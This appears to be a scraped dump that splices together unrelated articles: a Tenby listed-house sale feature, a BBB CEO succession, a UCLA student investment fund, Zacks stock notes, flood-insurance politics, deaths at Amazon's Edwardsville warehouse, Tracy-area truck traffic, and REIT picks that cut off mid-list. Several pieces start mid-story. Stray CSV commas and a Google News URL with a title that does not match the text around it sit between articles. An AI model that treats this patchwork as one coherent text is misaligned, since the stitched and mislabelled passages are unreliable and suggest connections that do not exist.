""It ticked all the boxes and had the added attraction of having a tenant in the shop who was paying a rent that was more than the combined mortgage gas electricity and telephone bills – in effect we were going to be living there for free!""

That's a definite property win but sometimes on a first date a house and a house hunter don't always 'click' - there's no initial love; no feeling that this is 'the one'.

(Image: West Wales Properties Temby) (Image: West Wales Properties Temby)

But Frogmore House was not going to disappoint the couple - it gave them a big warm welcoming hug as soon as they stepped inside and started exploring the four floors.

Vaughan says: ""The house itself has a really friendly vibe all about it. Ruth has spent time in it alone at night but has never felt nervous or uneasy. It has a really nice feeling not eerie at all even though it's so big.""

And it's the size that first impressed the couple when they viewed the home as well as offering them the opportunity for rent from the shop and then for Ruth to set up her own wool shop.

(Image: West Wales Properties Temby) (Image: West Wales Properties Temby)

Vaughan says: "" We love the property because it is really big. It is a fantastic house for parties due to the size and number of rooms. We have held numerous parties here and have many happy memories of them.""

When the couple explored outside in the private walled garden they were immediately intrigued by and drawn to the slice of Tenby's historic town wall that is the wall at the end of the garden and some days they put it to good use.

""Having the town wall at the end of the garden is great because every Ironman competition we put a ladder up against it and I sit in the castellation whilst Ruth stands on the ladder and we both wave Welsh flags and cheer the competitors on from our elevated position"" Vaughan adds.

And while you're exploring the town wall you might spot a fairly hidden doorway under the terrace taking the intrigue to a whole new level.

(Image: West Wales Properties Temby) (Image: West Wales Properties Temby) (Image: West Wales Properties Temby)

The dark doorway only really appears as you climb the charming stone steps to the first terrace and then once you spot it there's no stopping you from going to investigate - curiosity will drag you in.

Vaughan says: "" The room at the end of the garden on the left-hand side was used by the Lillycrop family fishmongers to smoke fish but we do not know what it was before then or when it was built.""

But there's also another dark doorway on the other side of the terrace that adds another layer of intrigue to the property.

""The opening on the right-hand side leads into a short tunnel that simply ends at the town wall and it has always been a mystery as to why it was built"" says Vaughan.

""The house is listed because the shop frontage is a classic example of a Pembrokeshire shop front. In the recent past the shop has sold many things including clothes chocolates and video games.""

The house achieved its Grade II listing in 2002 as a 'three-storeyed stuccoed house with well-designed oriel and shopfront'.

According to website British Listed Buildings the end terrace house could possibly have originally been detached and dates back to 1856 with the plaque on the front facade displaying the property's date of birth as well as its name; Frogmore House.

(Image: West Wales Properties Temby) (Image: West Wales Properties Temby) (Image: West Wales Properties Temby)

The house still boasts its beautiful 20th century shop front the former Lillycrop fishmonger's shop.

The website states that the Lillycrops were a long-established Tenby fishing family and local landmarks of their presence include a memorial window in the fishermen's chapel on the harbour dedicated to two family members who drowned in 1881.

Ruth and Vaughan were captivated by the history of the house as well as the surviving features they inherited when the house buying contracts were completed.

Help with your hunt for a home here:

Vaughan says: ""So far as we can tell the rooms have hardly been altered since it was built.

""This means that the coving in reception rooms goes all around each room without interruption. There are not many big town houses left in Tenby that have not been subdivided or altered in a way that leaves the coving seeming to end abruptly at a wall.""

Entering the house via the front door next to Ruth's wool shop gets you into a light hallway that leads to handy store rooms a period staircase and the welcoming kitchen diner.

This sociable room offers plenty of space to cook eat and chat surrounded by tasteful decor that pays homage to a classic country kitchen style but has all the benefits of a modern home.

The decor combines vintage pieces with modern extras wrapped in an interior design that focuses on the natural - wood and stone are the principle components - with a cooker nestled into the chimney breast boasting a robust wood mantle above.

The room flows directly out into the garden via a set of French doors into Ruth's favourite feature at the property the outdoor space where she loves to sit amongst the flowers in the summer watching the butterflies flutter past.

(Image: West Wales Properties Temby) (Image: West Wales Properties Temby)

Up to the first floor and at the back of the house there's a formal dining room and separate study as well as a bathroom on the landing but it's the front of the house that demands the most attention on this level.

The feature bay window is a joy to discover as is the cornicing ceiling plasterwork and central rose complemented by archway alcoves; no wonder it's the place Vaughan is most drawn to.

He says: "" My favourite room is the lounge with its high ceiling and bay window in which I can sit read and watch the world go by.

And it's the town wall that is my favourite feature; it constantly reminds me of the history of Tenby itself.""

(Image: West Wales Properties Temby) (Image: West Wales Properties Temby)

The second floor offers four bedrooms and a shower room and then the final floor in the attic keeps the surprises at this house coming.

At the top of the house there's a master bedroom complete with feature roll-top bath a cloakroom and a music room that can happily accommodate a baby grand piano.

And it is this room that fills Ruth with the most joy maybe because of a feature that the couple have added to the house.

(Image: West Wales Properties Temby) (Image: West Wales Properties Temby)

The only aspect that the home was missing for the couple when they bought Frogmore House was a glimpse of the sea but clever design has added that feature too.

Vaughan says: "" The property was charming when we bought it but did not have a sea view.

""Therefore we altered the roofline to incorporate a Juliet balcony and a dormer at the front. At the same time we altered the kitchen to make it lighter and bigger.""

(Image: West Wales Properties Temby)

The last surprise that the house can throw at you is more hidden spaces hidden but this time inside the house and not in the garden.

The house has a fairly large cellar that has two rooms to discover and extra space to utilise.

One room has a stone fireplace and what looks like maybe two bricked up windows. Wander into the other underground room and there's a log burner in the fireplace and lots of storage space for all your coastal outdoor equipment that living by the seaside might generate.

(Image: West Wales Properties Temby) (Image: West Wales Properties Temby)

The couple love living in Tenby but although they adore Frogmore House feel it's time to downsize.

Vaughan says: ""Tenby is a lovely seaside town and as if we did not know already we realised how lucky we were during the recent lockdowns when we had miles of beaches at the end of the street almost to ourselves.""

And out of lockdown the town and this street has a local community vibe and a connection with tourists that matches the friendly nature of Frogmore House.

Vaughan says: ""Running a shop in a tourist town is great fun. Ruth gets many repeat customers who come on holiday clutching a list of their wool requirements and come here as soon as they have booked into their accommodation.

""They love her so much that they even bring presents and send Christmas cards – only yesterday a lady brought in a tin of homemade mince pies and a ginger cake as a Christmas present!

""The people who live and work in Lower Frog Street form a really friendly and close-knit community. We rarely leave the house without someone saying hello and engaging us in conversation – nobody could ever become lonely here.""

Frogmore House is for sale for offers in excess of £800000 with West Wales Finest Properties call the Tenby branch on 01834 845584 to find out more.

Her role with the organization will expand as president of the board of directors starting Jan. 1 then as CEO when the current chief executive Carol Potter retires in May.

The BBB announced the news Dec. 9 at its annual meeting of accredited businesses at the Davis Education & Visitor Center at Fellows Riverside Gardens. Families of both Ames and Potter were on-hand for the passing of the torch.

Ames who usually operates behind the scenes during the annual meeting was front and center during the event the theme for which was “We are wearing our heart on our sleeve.” The sentiment seemed appropriate as an emotional Ames shared her experience working with Potter.

“For the past 10 years I have been lucky enough to have a true mentor and friend in Carol Potter” Ames said. “She has helped bring to the forefront every day what we came to do. And it’s fulfilling the mission of the Better Business Bureau in the Mahoning Valley.”

BBB President-elect and incoming CEO Melissa Ames looks forward to an exciting 2022.

Ames thanked Potter for her passion drive and commitment to the BBB’s mission its staff its board and accredited businesses.

Oftentimes the BBB is the only resource for consumers and residents to find trustworthy businesses in the Mahoning Valley for their needs Ames said. That is what makes the work meaningful she said.

“I am beyond blessed to do something that I love” she said. “Every day is different – different challenges different experiences. But in all of that we get to make very meaningful impact to those within our community.”

Ames said 2022 will be an exciting year as the BBB is ready to come out of the pandemic and get back to working more closely with its accredited businesses.

In the months leading up to her retirement Potter will work to ensure a seamless transition by continuing to mentor Ames and connecting her to the businesses and CEOs in the BBB network.

“As much as I’ve put BBB center in my thoughts Melissa will continue to do that” Potter said.

Potter thanked the board and accredited businesses for the opportunity to lead the BBB.

“It’s a position that has been so rewarding and I’ve treasured it more than anything else that I’ve done in my life” she said. “When you care about an organization and you look into the future you want to make sure that leadership continues to yield successes.”

Under Potter’s leadership the BBB created the Torch Awards for Marketplace Trust which honors local businesses nonprofits and civic leaders. In so doing she established the BBB TrustBuilders: Farmers National Bank PNC Premier Bank and Huntington Bank.

Potter also developed partnerships with Farmers Trust Co. and Sweeney Chevrolet Buick GMC to create the BBB Ethics & Integrity Scholarship Program. The program has awarded more than 35 $1000 scholarships in seven years.

Jennifer Johnson BBB board chairperson and area manager at Aqua Ohio commended Potter for her leadership and welcomed Ames into her new role.

“To say our businesses are experiencing unprecedented times is certainly an understatement” Johnson said citing workforce shortages supply chain delays and uncertain COVID-19 mandates.

During the pandemic companies that went out of business or had to leave the BBB for financial reasons led to a “significant number” of accredited businesses leaving the organization Potter allowed. Yet in 2021 the Mahoning Valley chapter enjoyed a 96% retention rate of its members.

In the Mahoning Valley the business community exemplifies a “long-standing support of trust and ethics” Potter said.

The 12 student portfolio managers — aka Fellows — sit in a U-shaped formation around three advisors: Professor Bill Cockrum; Anderson Board of Advisors member Shelby Notkin retired chairman of Capital Group Private Client Services; and Shawn Patt ’00 M.B.A. ’07 an Anderson lecturer longtime wealth manager and currently principal/CEO of Atala Financial. SIF alumnus Keith Webster M.B.A. ’91 managing director at First Republic Investment Management participates via Zoom.

A lively discussion of an energy investment follows with the Fellows debating whether to hold on to the security. Talk surrounds market dynamics supply and demand and energy inventories in Asia and Europe. After the student presentation Cockrum asks the advisors for input. Notkin has mixed emotions while Patt wonders if the current supply and demand conditions will persist adding some historical perspective from his experience. The Fellows decide to keep the investment at least for now.

Next the group debates the merits of a few investments in the travel industry. An airline dependent on Japanese travel might have limited growth potential as the Asian nation still has pandemic-induced travel restrictions while another firm that leases aircraft appears promising. Notkin wonders if the group has pondered the implications of fuel prices. They have: The airline is more vulnerable than the leasing company. Webster approves of swapping the investments and seems impressed. The Fellows have clearly done their homework.

Then Cockrum raises a final but essential issue: He asks the group to raise their hands if they’ve got a job lined up.

Seven of the 12 raise their hands. One — in the Executive M.B.A. program — isn’t looking. For the remaining four Cockrum demands a status update insisting they reach out to him and the other advisors. He wants to know for which students he needs to make calls. Jobs matters to him: Over the last three years every SIF Fellow has secured a position in the investment management industry before graduation.

The roots of the SIF date back to the mid-1980s when Bernard “Bun” Johnson ’48 co-founder of Provident Investment Counsel and his partner Robert Kommerstad saw real-world investment experience as indispensable in preparation for careers in investment management. Johnson communicated this concept to Anderson’s dean J. Clayburn La Force Jr. M.A. ’58 Ph.D. ’62 who liked what he heard. La Force asked Cockrum to bring the plan to the UCLA Foundation which gave its approval about a year later.

Cockrum often described as tough and demanding is also loyal caring and selfless. His relationship with Anderson began when he recruited its M.B.A.s as a senior officer at Becker Paribas Inc. (formerly A.G. Becker & Co.). An Anderson alumna-turned-Becker-employee Robin Grace Warren M.B.A. ’82 introduced Cockrum to Professor Al Osborne (now a senior associate dean) who brought the executive on board to teach a course in entrepreneurship. The course drew rave reviews earning Cockrum his first teaching award. He went on to teach several classes including an investing course that evolved into the SIF.

In 1987 Provident pledged $50000 per year over five years to start the fund. Its contribution was matched by a $250000 grant from Kayne Anderson the investment firm founded by Anderson alumnus Richard Kayne M.B.A. ‘68 and alumnus/namesake John E. Anderson ’40. In 1993 the Friends of the Student Investment Fund program was launched to support the fund. To date total fund contributions have exceeded $2.5 million.

The Fund’s portfolio currently features a variety of investments including equities fixed income international emerging markets alternatives master limited partnerships (MLPs) and real estate investment trusts (REITs). The portfolio is allocated across 11 industry sectors: financials information technology consumer discretionary materials communication services utilities consumer staples energy health care and real estate.

At press time the fund is valued at $4.2 million. Nearly 300 Anderson Fellows have participated in the program and the fund has distributed $2.2 million in financial aid to Anderson students.

“If you think about all the giving back they’ve done — both to Anderson and to other charitable causes — it’s a massive pay-it-forward.”

— David Carpenter SIF advisor

Competition to become an SIF Fellow is fierce with dozens of applicants vying for up to 12 spots. Students from the full-time fully employed and executive MBA programs are eligible and the experience fulfills the capstone requirement for graduation.

The application includes a stock write-up on an assigned company and a personal essay detailing relevant experience and recent market events. An in-depth presentation on a company of the applicant’s choice is followed by a final panel interview.

“It’s more like a behavioral interview to assess your fit and your passion” says former Fellow Caroline Ward M.B.A. ’21 now a research analyst with Artisan Partners. She notes “Many students have prior experience but a lot are coming in fresh.”

Once selected the incoming cohort of SIF Fellows spends months researching companies in preparation for the fund’s annual transition from the graduating class. Ward says “We worked as a group to figure out what we wanted the portfolio to look like so we were ready for a smooth handoff to the incoming class.” To mitigate the constantly changing cast of portfolio managers the Fellows look for investments with long-term potential. In 2021 the student managers introduced a new long-term portfolio sleeve to ensure consistency over time.

Like Ward Ed Jean-Louis M.B.A. ’16 a co-founder and managing director of Tale Venture Partners cites the SIF as one of the reasons he chose Anderson. “One of the first things I learned was that investing is just part of the job” Jean-Louis says. “Relationship management is another part. But you have to have great back office and reporting functions as well. That was one of the elements of SIF — teaching us how to run an organization as opposed to just how to invest.”

Liam Eisenberg

The Fellows meet bi-weekly throughout the summer and every Monday the rest of the year. The real time is put in after hours when they meet in teams to analyze and strategize. They then bring their research to class to present to the advisors. With real dollars and real stakes it’s no time to be fragile.

SIF advisor David Carpenter M.B.A. ’98 who spent two decades after management school as a portfolio manager and investment analyst with Capital Research and Management before pivoting to the wine industry in Central California still appreciates Cockrum’s demanding approach and how the SIF experience prepares Fellows for careers in investment management. “A ‘donkey BBQ’ is when you’ve not done what’s expected or what’s required or if the job you’ve done isn’t up to snuff. It’s a public grilling in front of the group.”

“The SIF fellows [today] are really bright far more advanced than we were 30 years ago as far as their prior experience and ability to gather market information” says Webster. “I’m constantly learning from them. Whether it’s digital currencies or geopolitical events like China cracking down on their tech entrepreneurs — I’m learning weekly.”

Long-term investments require long-term plans. And while the SIF’s story is very much intertwined with its faculty leader Cockrum has already begun planning for when he’s no longer involved. “We have a time-tested program and terrific advisors in place” he says. “I am sure the students will continue to be successful in managing the fund for decades to come.”

Indeed the impact of both Cockrum and the SIF has been profound both through the careers launched and the dollars donated.

“Bill’s amazingly generous story is that he spent half his working life giving back — including his salary — teaching great classes and developing great M.B.A. students. The SIF is just the icing on the cake” Carpenter says. “The SIF alumni have gone on to terrific success. If you think about all the giving back they’ve done — both to Anderson and to other charitable causes — it’s a massive pay-it-forward.”",,,,,,,,,,,,

You can see all of today’s research reports here >>>



Procter & Gamble’s shares have outperformed the Zacks Soap and Cleaning Materials industry over the past year (+9.9% vs. +8.3%). The company has been gaining from robust pricing and a favorable mix along with strength across segments.



Procter & Gamble has been focused on productivity and cost-saving plans to boost margins. This led to bottom line beating the consensus mark for the seventh consecutive quarter in third-quarter fiscal 2024. Consequently PG has provided an optimistic fiscal 2024 view.



However the company has been witnessing supply-chain issues higher SG&A costs higher transportation costs and rising inflation. Its significant international presence exposes it to foreign currency risks which acts as a headwind.

Shares Verizon of have outperformed the Zacks Wireless National industry over the past year (+12.8% vs. +11.7%). The company has reported modest first-quarter results with the bottom line beating the Zacks Consensus Estimate but the top line missing the same. The deployment of a cloud-native container-based virtualized architecture has led to increased flexibility scalability and cost efficiency across its network.



Verizon is offering various mix and match pricing in both wireless and home broadband plans which has led to solid client additions. Focus on emerging growth services like cloud security and professional services will likely reap long-term benefits.



However lower wireline and wireless equipment revenues are major concerns. Huge promotional expenses and lucrative discounts to expand customer base are weighing on margins. High capital expenditure for continuous network upgrade and fiber deployment is a headwind. A muted guidance for 2024 is worrisome.



(You can read the full research report on Verizon here >>>)



Intuitive Surgical’s shares have outperformed the Zacks Medical - Instruments industry over the past year (+25.7% vs. +4.0%). The company ended the first quarter on a positive note beating estimates on both counts. Revenues improved year over year. The strong performance is likely to continue in 2024 on the back of continued growth in the company’s da Vinci procedure volume coupled with strong Ion procedure growth.



ISRG’s initiative to increase the pricing of procedures should also continue to aid in sales growth in 2024.Improving procedure volume along with better system placements and services across all markets will drive top-line growth this year. Launch of da Vinci SP in Europe and da Vinci 5 in U.S. market should drive system placements higher.



However ongoing supply chain constraints although easing are likely to hurt the availability of devices. Labor shortage in hospitals will likely act as a headwind to procedure growth in 2024.

Conservatives deride them as (literal) coastal elites; progressives demand they fork over more in taxes. Both parties happily accept their campaign contributions but few members of Congress shed tears for the plight of waterfront barons and fewer still are willing to wage a public fight on their behalf.

Robert Menendez the senior senator from New Jersey is one of those brave lawmakers. Menendez is leading the opposition to a first-of-its-kind policy that would force homeowners with property closest to the water to pay more for federal flood insurance. The pricing scheme known as Risk Rating 2.0 was first developed under the Obama administration but the Trump administration delayed its implementation. Now it represents one of the most progressive changes that President Joe Biden can make without new approval from Congress: By overhauling premiums in the National Flood Insurance Program the government can simultaneously price-in the risks posed by climate change and correct historic inequities in which millions of lower-income homeowners have essentially subsidized flood protection for their much wealthier neighbors.

At the center of the fight are the questions of who gets to live by the water and who should shoulder the burden of costs that rise with the sea level. The estimated 13 million people who reside in the officially designated floodplain are divided between those who can buy pricey waterfront homes and those consigned to live in less desirable low-lying areas because that’s all they can afford. Some of the people hardest-hit by major recent storms have been vulnerable communities in New Orleans; Port Arthur Texas outside Houston; and poor neighborhoods in the farthest reaches of New York City. The updated flood-insurance system is designed to help those populations but in coastal communities across the country uncertainty about the new prices is spreading fear that however well intentioned the administration’s policy will exacerbate the inequality of beachfront living pushing out homeowners most sensitive to climbing insurance rates.

Environmental and national real-estate and insurance industry groups have cheered the new system which took effect in October for new insurance policies and will kick in next spring for renewals. It has drawn predictable criticism from Republicans in coastal states such as Florida Louisiana and Mississippi that are drenched annually by hurricanes and tropical storms. But the lawmakers fighting hardest to block the change are Democrats like Menendez who otherwise support combatting climate change and wealth inequality.

Under Risk Rating 2.0 nearly a quarter of the nation’s 3.4 million policyholders in single-family homes would pay less for flood insurance—the first time in the 53-year history of the federal program that the cost of any policies has actually gone down. The bulk of homeowners would see a modest increase—up to $10 a month—roughly equivalent to what they would have paid under the old system. The remaining 11 percent of customers would see more substantial increases that would compound over several years. Some homeowners would end up paying thousands of dollars more per year for flood insurance and a higher percentage of them live in states such as New York and New Jersey where coastal properties are more expensive.

“What we’re going to have is rate shock” Menendez told me in a phone interview. “That is going to drive policyholders out of the program and insurance is about spreading risk over the widest pool of people.” The third-term senator has along with a bipartisan coalition of lawmakers from coastal states urged the Biden administration to delay the implementation of Risk Rating 2.0. He’s proposed legislation to cap annual premium hikes for flood insurance at 9 percent; the current maximum is 18 percent for primary residences and 25 percent for second homes. Menendez and his allies are also considering an effort by Congress to block the policy as part of upcoming government-funding legislation that Biden will have little choice but to sign. “We’ve got all options on the table” he said. The coastal coalition that Menendez is now leading has flexed its power over the flood program before: A decade ago Congress enacted reforms that resulted in higher insurance rates only to reverse itself two years later under political pressure.

For years the crude system for calculating flood premiums made no distinction between fancy homes that were directly on the water and tiny shacks a mile inland. “It led to a bias against lower-value homes” Laura Lightbody the director of a flood-risk initiative at the Pew Charitable Trusts told me. “Those lower-value lower-risk homes were often paying too much and higher-risk homes weren’t paying enough.” Under Risk Rating 2.0 pricing can be much more precise taking into account factors like a home’s specific flood risk and its replacement cost.

Like all good politicians the critics of Risk Rating 2.0 don’t cast themselves as champions of the rich. The constituents they claim to be protecting aren’t the seaside elite but the working-class citizens of inland cities like Paterson New Jersey which is a half-hour drive north of Newark. “We’re just concerned that this is going to be a disaster for these middle-class working families” Representative Frank Pallone a New Jersey Democrat and the progressive chairman of the House Energy and Commerce Committee told me. “They want some sort of assurance that the premiums are not going to go up.”

To the Biden administration however the New Jersey Democrats are waging a curious fight. More homeowners in Paterson for example will see lower premiums as a result of Risk Rating 2.0 rather than a spike in costs. The same is true across the country. “You can’t just ignore that” David Maurstad who runs the National Flood Insurance Program for FEMA told me. Nationwide he said only 3500 homeowners will see premium increases of more than $100 a month and those houses are valued at more than $1 million.

Menendez wants to shield those people too because in high-cost New Jersey owning a million-dollar home is not a signifier of extreme wealth. The state has one of the country’s largest percentages of homes valued at more than $1 million and its median home price is well over the national average. On that score the battle over flood insurance resembles the debate among Democrats over the state and local tax deduction or SALT. Lawmakers from New Jersey New York and other high-tax states have demanded that Congress revive the tax break—which Republicans gutted under President Donald Trump—despite the fact that its biggest beneficiaries would be millionaires. Menendez told me he’s used to such attacks. “People want to say that this is for the wealthy. They’ll say it no matter what but I don’t know what wealthy is to them” he said. “Is a $400000 home wealthy? Is it a half-a-million-dollar home? Is it a million-dollar home? I don’t know. But in New Jersey a lot of middle-class families are in homes that I’m sure others would consider wealthy.”

Read: How the Build Back Better Act could backfire on Democrats

Opponents of the bill that Menendez and Pallone proposed point out that it would cap rate increases even for second homes; the Democrats contend that many of their constituents who own vacation homes have inherited them and would be forced to sell if their insurance rates spiked.

The Biden administration argues that if lawmakers like Menendez succeed in delaying the new pricing system the biggest losers will be the lowest-income homeowners who will miss out on the savings of reduced premiums. But for the supporters of Risk Rating 2.0 the more troubling prospect is that it delivers on its promise of a fairer insurance program—and the wealthiest Americans win out anyway.

Jody Stewart owns a home on the New Jersey coastline but it is not a mansion and she is not a millionaire. She lives by a bay on the Mystic Island peninsula a casino community about a 40-minute drive from Atlantic City. Stewart and her husband a retiree rebuilt their 1300-square-foot home—“just a little place” she told me valued at about $350000—after it was destroyed by Sandy. Stewart hasn’t received her flood-insurance renewal notice and doesn’t know what her new rate will be; the couple’s decision to construct their home on an elevated platform after the storm has saved them money on premiums. But she worries that the rate increases—whether modest or more substantial—will accelerate a trend in which wealthier people building homes two or three times the size of hers are replacing the community that had lived on Mystic Island for decades. “You’re just going to see working-class people quit paying for insurance” Stewart told me. “They’re just going to quit or they’re going to walk away from their homes because they can’t afford it.”

Stewart now works for an advocacy group of storm survivors known as the New Jersey Organizing Project. “I don’t say this nicely or lovingly” Stewart began. “We are sinking. We are at the forefront of climate change.”

Climate change is the major complicating factor in the debate over flood insurance and the new scheme allows the government to better warn people about the increasing risk of living in a flood zone—and force them to shoulder more of the financial burden to do so. “Climate change is causing floods to become more common and more frequent which means more people will find themselves at risk” Joel Scata a water and climate attorney for the Natural Resources Defense Council told me. “And rates for federal flood insurance are already rising.”

Democrats like Menendez and Pallone have backed aggressive action to tackle climate change both in supporting efforts to slow its pace and to build up resiliency in high-risk areas. Superstorm Sandy devastated New Jersey and left homeowners who struggled to get payouts from insurance companies frustrated with FEMA and the flood-insurance program. “Unfortunately most people do not trust FEMA or the government” Stewart said. More recently the torrential flooding caused by Tropical Storm Ida stunned both New Jersey and New York which were unprepared for the damage.

Critics of the rate hikes say they are particularly unfair for people who have already been victimized so frequently by storms over the past decade. But defenders of the new system argue that opponents are simply trying to have it both ways. “You cannot say that climate change is exacerbating this risk and then presume the risk got cheaper. That’s hypocritical thinking” says Roy Wright who ran the federal flood-insurance program when officials began to develop Risk Rating 2.0 toward the end of the Obama administration.

The more vexing question—one that FEMA is hesitant to confront—is whether government policy should actively discourage development and home-buying in areas under the gravest threat from climate change. “At some point members of Congress and policy makers have to make a decision about addressing sea-level rise and climate change and not continuing to enable people to live and develop in these high-risk areas” Lightbody said.

Maurstad told me the intent of Risk Rating 2.0 was not to discourage development anywhere. But the policy is already having an impact on the real-estate market in New Jersey’s coastal communities Robert White the president of the state’s real-estate-agents association told me. White who is a broker in a beach town on the Jersey Shore told me that although the new rates were not hobbling purchases of higher-end homes they were pricing people out of mid-range houses as potential buyers saw the cost of flood insurance added to their mortgage. “We see it every day” White said. Flood insurance is required for homes that have federally backed mortgages in high-risk areas. Purchasers who can pay for their houses without taking out a loan can choose to forgo flood insurance; the super-wealthy buyers who plunk down $3 million in cash for a beach house know they can afford to rebuild from scratch if their home is destroyed or they are better equipped to handle steeper insurance costs.

The end result critics of Risk Rating 2.0 fear is a coastline that is even more of an exclusive haven for the very rich than it is now. “They’re going to build mammoth properties which doesn’t help the environment. You’re just gentrifying our communities” Stewart said. One of Menendez’s reasons for keeping premium hikes low even for the wealthy and for owners of vacation homes was to keep them from fleeing the federal insurance program; other lawmakers have cited a projection that as many as 900000 policyholders will drop their flood insurance over the next several years because of the rate hikes imperiling the program’s solvency.

The Biden administration disputes these claims. Maurstad predicting that the rolls of the flood-insurance program will grow rather than shrink in the coming years said that the government’s ability to better communicate flood risk would help demonstrate the need to purchase coverage. But he was less optimistic on the question of how widely accessible the waterfront should be. Maurstad said he had seen too many families without insurance whose homes and lives had been wrecked by storms. “It doesn’t seem to me to be good public policy” he said to encourage “those that are least able to bounce back after major disaster events” to live in risky areas. In the age of climate change in other words the beaches must remain a playground for the rich—now more than ever.",https://news.google.com/articles/CBMiaGh0dHBzOi8vdGVzbGFtb3RvcnNjbHViLmNvbS90bWMvdGhyZWFkcy9kZWVyLWhlYWQtYnV0dGVkLW15JUUyJTgwJUE2ZGltaW5pc2hlZC12YWx1ZS1jbGFpbS4yNDk1NjkvcGFnZS0y0gEA?hl=en-US&gl=US&ceid=US%3Aen,Deer Head Butted MY…Diminished Value Claim? | Page 2,"leaftoy said: Dude Rhode Island has higher government debt as a percentage of GDP than CA (which is a reasonable way to measure this instead of just looking at total debt or per capita debt).

""How many workers must die for Amazon to have a policy for extreme weather events?""

""Time and time again Amazon puts its bottom line above the lives of its employees"" said Stuart Appelbaum president of the Retail Wholesale and Department Store Union (RWDSU) in a statement. ""Requiring workers to work through such a major tornado warning event as this was inexcusable.""

Appelbaum's remarks came after an outbreak of over 20 devastating tornadoes late Friday tore through multiple states and killed dozens of people. In addition to Illinois affected states included Arkansas Kentucky Mississippi Missouri and Tennessee.

Among the buildings struck was an Amazon facility in Edwardsville Illinois--a community about 30 minutes from St. Louis. Local officials said Saturday that at least six people died from the collapse.

Local KMOV reported:

The walls on both sides of the building collapsed inward causing the roof to fall. The 11-inch-thick 40-feet-tall walls could not sustain the tornado that hit the building Friday night. The National Weather Service confirmed that it was a category EF-3 tornado that went through Edwardsville Friday night. Winds picked up to as much as 150 mph.

The number of workers inside the building at the time of collapse is not yet determined. Edwardsville Fire Chief James Whiteford said at a press conference late Saturday that one person was injured and 45 people were rescued.

According to the St. Louis Post-Dispatch:

By Saturday evening first responders had shifted from an emergency response to a recovery effort. While they would continue to go through the rubble during daylight hours over the next three days Whiteford said he doesn't know whether any other victims will be found inside.

Shortly before the facility was hit the National Weather Service's Storm Prediction Center warned of an increasing ""damaging wind and tornado threat"" for the area.

As some observers pointed out on social media Amazon has previously failed to close warehouses in the face of extreme weather events:

""How many workers must die for Amazon to have a policy for extreme weather events?"" sociologist Nantina Vgontzas tweeted Saturday. ""It's currently up to local management and this is clearly disastrous. Condolences to the families and survivors of this horrific avoidable tragedy.""

In his statement Appelbaum called the event ""another outrageous example of the company putting profits over the health and safety of their workers and we cannot stand for this.""

""Amazon cannot continue to be let off the hook for putting hardworking people's lives at risk"" he said vowing that his union would ""not back down until Amazon is held accountable for these and so many more dangerous labor practices.""

Adding to the fresh scrutiny of the online giant's labor practices as Bloomberg reported Saturday are its policies regarding employees' mobile phone access. From the reporting:

Amazon had for years prohibited workers from carrying their phones on warehouse floors requiring them to leave them in vehicles or employee lockers before passing through security checks that include metal detectors. The company backed off during the pandemic but has been gradually reintroducing it at facilities around the country.

""After these deaths there is no way in hell I am relying on Amazon to keep me safe"" one unnamed worker from another Amazon facility in Illinois told Bloomberg. ""If they institute the no cell phone policy I am resigning.""",,,,,,

But residents of the two-lane rural road whose southern half bisects the project say that couldn't be further from the truth.

One resident counted more than 100 cars in a day. Another placed boulders in her front yard to shield her property. And another couple built a garage as a sound barrier.

Multiple residents said semi-trailer trucks coming to and from the warehouses traverse Hansen Road day and night shaking homes as they clatter over speed bumps. They have run down cypress trees and burst through traffic barriers. Kids can no longer walk to a nearby school.

High-tonnage trucks are illegal on Hansen but Peter Moyer said he has counted as many as 125 in a day. ""It'll actually shake you and rattle you out of your bed.""

Trailer trucks are only part of the problem. Hansen also attracts commuters rushing to and from work many wearing the orange vests of nearby warehouse workers.

The traffic may be a manifestation of the explosion of warehousing in Tracy and across San Joaquin County.

More:SJ County has second highest concentration of transportation warehouse jobs

In 2019 the county had the second-highest concentration of transportation and warehousing jobs out of all metropolitan areas in the U.S. Amazon alone has bought more than 10 million square feet of property in the county in the past eight years.

It's unclear why so many trailer trucks have flocked to Hansen Road. It could be the access to nearby interstates 205 and 580: with fewer traffic signals than Mountain House Parkway Hansen Road could be a time-saver for truckers trying to meet tight schedules.

County public works officials have tried numerous measures to keep trailer trucks off the road: warning signs thousand-pound orange barriers and even asking Google Maps to redirect drivers. Prologis stationed two security guards near the warehouses to stop trucks from entering Hansen Road.

But the trucks kept coming. Closing the road to southbound drivers reduced traffic volume but it has increased again in recent months residents said.

They said the constant noise impacts the quality of life at home.

The booms of trucks crossing speed bumps keeps Moyer who is a combat veteran up at night.

""I spent my year in Vietnam. I know what it's like when something rattles and shakes"" he said. ""It sounds like a gun or a cannon going off. It sounds like a bomb.""

Vannie and Raymond Dart built a garage between their home and the road to muffle the noise. Cheryl Valdez placed boulders outside her home as a shield after finding the remains of nearby mailboxes in her yard.

""They were obliterated. They were on my front lawn ... the parts were all over scattered everywhere.""

Residents stressed that they do not oppose the businesses that occupy Prologis Park which include Amazon UPS and FedEx. Moyer said he appreciated the jobs the project has created.

There are several ways public works officials could deter trucks from Hansen. One would be to make the southbound closure permanent. Another would be to use barriers to block all but regular-sized cars from entering.

More than 80% of residents want to close Hansen entirely by erecting metal gates accessible only by emergency vehicles a poll by a community group found. But that could raise legal risks for the county San Joaquin County Public Works Director Kris Balaji said.

On Monday Public Works staff and community members will meet at Mountain House Town Hall to discuss a solution acceptable to all.

""The road that we live (on) that's in front of our house doesn't just belong to us"" Balaji said.

Assuming a market correction or even a market crash could be in the near future is not crazy thinking. The last 11 years from 2009 to early 2020 marked the longest bull market in stock market history. The market correction that came with the onset of the global pandemic in early 2020 for some signaled the end of our great ""bull run."" But given how quickly the markets recovered and have well surpassed pre-pandemic highs it seems to many that we're right back in the midst of an unstoppable bull market. Others have reason to believe in the potential for another correction.

But even if they come bull markets don't last forever. Inevitably the stock market will fall and take on the much-dreaded bear market moniker. Many of the stocks that shot up over the past decade will see some level of price correction.

Savvy investors know that bear markets are an incredible time to double down on select stocks and real estate investment trusts (REITs) because they are trading at a discount. While there are countless high-quality REITs to choose from here are three that really stand out as great buys during the next bear market.

1. American Tower

When it comes to real estate it's important to choose operators in industries that are not only backed by high demand today but will be well into the future. Growing reliance on technology data and cloud storage isn't going to change anytime soon. Providers like American Tower (AMT -1.01%) one of the largest cell tower REITs in the world and the largest REIT by market cap are a big part of what keeps our world connected. The company has a global presence operating and leasing around 219000 communication sites in Africa Latin America North America and Europe.

